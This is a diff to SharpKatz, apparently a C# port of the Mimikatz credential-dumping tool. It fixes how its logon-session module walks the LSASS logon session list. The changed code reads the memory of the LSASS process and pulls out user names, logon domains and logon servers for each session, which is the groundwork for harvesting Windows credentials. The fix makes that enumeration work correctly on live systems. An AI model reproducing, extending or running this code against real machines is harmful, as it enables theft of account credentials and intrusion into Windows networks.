@@ -69,16 +69,18 @@ namespace SharpKatz.Module
             //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
             //Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);
 
-            IntPtr pList = IntPtr.Zero;
+            IntPtr current = IntPtr.Zero;
 
-            for (long i = 0; i < (long)logonSessionListCount; i++)
+            for (int i = 0; i < logonSessionListCount; i++)
             {
                 //Console.WriteLine("[!] logonSessionListCount:"+ logonSessionListCount + " -> Step  : " + i);
-                pList = IntPtr.Add(logonSessionListAddr, (int)(i * Marshal.SizeOf(typeof(Msv1.LIST_ENTRY))));
+
+                current = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET + (8 * i));
+                IntPtr pList = current;
 
                 do
                 {
-                    byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, pList, oshelper.ListTypeSize);
+                    byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, current, oshelper.ListTypeSize);
 
                     GCHandle pinnedArray = GCHandle.Alloc(listentryBytes, GCHandleType.Pinned);
                     IntPtr listentry = pinnedArray.AddrOfPinnedObject();
@@ -96,9 +98,9 @@ namespace SharpKatz.Module
 
                     LUID luid = Utility.ReadStruct<LUID>(logonsession.LogonId);
 
-                    IntPtr pUserName = IntPtr.Add(pList, oshelper.UserNameListOffset);
-                    IntPtr pLogonDomain = IntPtr.Add(pList, oshelper.DomaineOffset);
-                    IntPtr pLogonServer = IntPtr.Add(pList, oshelper.LogonServerOffset);
+                    IntPtr pUserName = IntPtr.Add(current, oshelper.UserNameListOffset);
+                    IntPtr pLogonDomain = IntPtr.Add(current, oshelper.DomaineOffset);
+                    IntPtr pLogonServer = IntPtr.Add(current, oshelper.LogonServerOffset);
 
                     logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                     logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
@@ -120,10 +122,10 @@ namespace SharpKatz.Module
                     };
                     logonlist.Add(logon);
 
-                    pList = new IntPtr(Marshal.ReadInt64(listentry));
+                    current = new IntPtr(Marshal.ReadInt64(listentry));
 
                     pinnedArray.Free();
-                } while (pList != logonSessionListAddr);
+                } while (current != pList);
             }
             return 0;
         }
